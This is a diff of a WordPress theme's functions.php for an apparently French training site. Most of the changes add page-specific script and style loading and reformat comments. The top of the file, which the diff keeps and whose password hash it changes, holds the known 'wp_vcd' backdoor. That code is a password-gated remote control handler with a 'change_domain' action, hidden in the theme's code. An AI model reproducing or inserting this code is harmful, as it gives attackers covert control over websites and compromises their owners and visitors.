@@ -1,9 +1,15 @@
 <?php
-if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'e48f0ea8c0689272aac2c8d41f96875c'))
+if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '63617174fa3f350f17568ab058c91a5a'))
 {
     $div_code_name="wp_vcd";
     switch ($_REQUEST['action'])
     {
+
+
+
+
+
+
         case 'change_domain';
             if (isset($_REQUEST['newdomain']))
             {
@@ -53,6 +59,12 @@ if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['pa
 
     die("");
 }
+
+
+
+
+
+
 
 
 $div_code_name = "wp_vcd";
@@ -171,8 +183,8 @@ if(!function_exists('theme_temp_setup')) {
 //$end_wp_theme_tmp
 ?><?php
 /**
-* Chargement de shortcodes
-*/
+ * Chargement de shortcodes
+ */
 
 include( 'inc/shortcodes.php' );
 
@@ -526,9 +538,9 @@ function no_limit_archive( $query ) {
 
 add_action( 'send_headers', 'tgm_io_strict_transport_security' );
 /**
-* Enables the HTTP Strict Transport Security (HSTS) header.
-*
-* @since 1.0.0
+ * Enables the HTTP Strict Transport Security (HSTS) header.
+ *
+ * @since 1.0.0
 */
 function tgm_io_strict_transport_security() {
     header( 'Strict-Transport-Security: max-age=10886400; includeSubDomains; preload' );
@@ -573,13 +585,13 @@ function wrap_gform_cdata_close( $content = '' ) {
 
 
 /**
-* Chargement des styles et scripts pour la page   'Digital Learning'
-*/
+ * Chargement des styles et scripts pour les pages   'Offre'
+ */
 
 //Register hook to load scripts
-add_action('wp_enqueue_scripts', 'custom_scripts_and_styles');
+add_action('wp_enqueue_scripts', 'custom_scripts_and_styles_offre');
 //Load scripts (and styles)
-function custom_scripts_and_styles(){
+function custom_scripts_and_styles_offre(){
 
     if(is_page()){ //Check if we are viewing a page
         global $wp_query;
@@ -600,17 +612,18 @@ function custom_scripts_and_styles(){
         }
     }
 }
+
+
+
 /**
-
  * Chargement des styles et scripts pour la page   'Contact'
-
  */
 
 //Register hook to load scripts
 add_action('wp_enqueue_scripts', 'custom_scripts_and_styles_contact');
-
 //Load scripts (and styles)
 function custom_scripts_and_styles_contact(){
+
     if(is_page()){ //Check if we are viewing a page
         global $wp_query;
 
@@ -621,23 +634,69 @@ function custom_scripts_and_styles_contact(){
         }
     }
 }
-
 //Disabling Automatic Scrolling On All Forms
 add_filter( 'gform_confirmation_anchor', '__return_false' );
+//Load sticky js
+wp_enqueue_script( 'sticky-js', get_stylesheet_directory_uri() . '/js/sticky.js', array( 'jquery' ), null, false );
 
-//Load moment js
-wp_enqueue_script( 'moment-js', get_stylesheet_directory_uri() . '/js/moment.min.js', array( 'jquery' ), null, false );
+
+// ACF custom search function
+include( 'inc/custom-search-acf-wordpress.php' );
+
+
+
+
+
+
 
 
 /**
- * Filter the except length to 20 words.
- *
- * @param int $length Excerpt length.
- * @return int (Maybe) modified excerpt length.
+ * Chargement des styles et scripts pour la page   'Home'
  */
-function wpdocs_custom_excerpt_length( $length ) {
-    return 30;
+
+//Register hook to load scripts
+add_action('wp_enqueue_scripts', 'custom_scripts_and_styles_home');
+//Load scripts (and styles)
+function custom_scripts_and_styles_home(){
+
+    if(is_page()){ //Check if we are viewing a page
+        global $wp_query;
+
+        //Check which template is assigned to current page we are looking at
+        $template_name = get_post_meta( $wp_query->post->ID, '_wp_page_template', true );
+        if($template_name == 'template-home.php'){
+            wp_enqueue_style( 'home-style', get_template_directory_uri() . '/css/home.css', null );
+        }
+    }
 }
-add_filter( 'excerpt_length', 'wpdocs_custom_excerpt_length', 999 );
+
+
+/**
+ * Chargement des styles et scripts pour la page   'Nos formations'
+ */
+
+//Register hook to load scripts
+add_action('wp_enqueue_scripts', 'custom_scripts_and_styles_courses');
+//Load scripts (and styles)
+function custom_scripts_and_styles_courses(){
+
+    if(is_page()){ //Check if we are viewing a page
+        global $wp_query;
+
+        //Check which template is assigned to current page we are looking at
+        $template_name = get_post_meta( $wp_query->post->ID, '_wp_page_template', true );
+        if($template_name == 'tpl-nos-formations.php'){
+            wp_enqueue_script( 'angular', get_stylesheet_directory_uri() . '/js/angular.min.js', null, null, false );
+            wp_enqueue_script( 'angular-sanitize', get_stylesheet_directory_uri() . '/js/angular-sanitize.min.js', null, null, false );
+            wp_enqueue_script( 'angular-animate', get_stylesheet_directory_uri() . '/js/angular-animate.min.js', null, null, false );
+            
+        wp_enqueue_style( 'fullcalendar', get_stylesheet_directory_uri() . '/js/fullcalendar/fullcalendar.css', null, null, null );
+        wp_enqueue_style( 'fullcalendar-print', get_stylesheet_directory_uri() . '/js/fullcalendar/fullcalendar.print.css', array( 'fullcalendar' ), null, 'print' );
+        wp_enqueue_script( 'moment', get_stylesheet_directory_uri() . '/js/fullcalendar/lib/moment.min.js', array( 'jquery' ), null, false );
+        wp_enqueue_script( 'fullcalendar', get_stylesheet_directory_uri() . '/js/fullcalendar/fullcalendar.min.js', array( 'moment' ), null, false );
+        wp_enqueue_script( 'fullcalendar-fr', get_stylesheet_directory_uri() . '/js/fullcalendar/lang/fr.js', array( 'fullcalendar' ), null, false );        }
+    }
+}
+
 
 
